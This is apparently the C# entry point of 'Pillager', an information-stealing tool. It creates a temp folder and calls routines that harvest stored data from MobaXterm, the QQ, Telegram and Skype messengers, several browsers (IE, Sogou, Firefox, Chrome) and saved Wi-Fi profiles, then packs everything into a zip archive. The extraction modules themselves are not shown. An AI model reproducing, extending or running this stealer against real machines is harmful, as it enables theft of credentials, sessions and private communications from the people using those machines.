using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using Pillager.Browsers;
using Pillager.Messengers;
using Pillager.Others;
using Pillager.Tools;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
            string savezippath = savepath + ".zip";
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            //Tools
            MobaXterm.Save(savepath);

            //Messengers
            QQ.Save(savepath);
            Telegram.Save(savepath);
            Skype.Save(savepath);

            //Browsers
            IE.Save(savepath);
            OldSogou.Save(savepath);//SogouExplorer < 12.x
            FireFox.Save(savepath);
            Chrome.Save(savepath);

            //Others
            Wifi.Save(savepath);

            //ZIP
            ZipFile.CreateFromDirectory(savepath, savezippath);
            Directory.Delete(savepath, true);
        }
    }
}
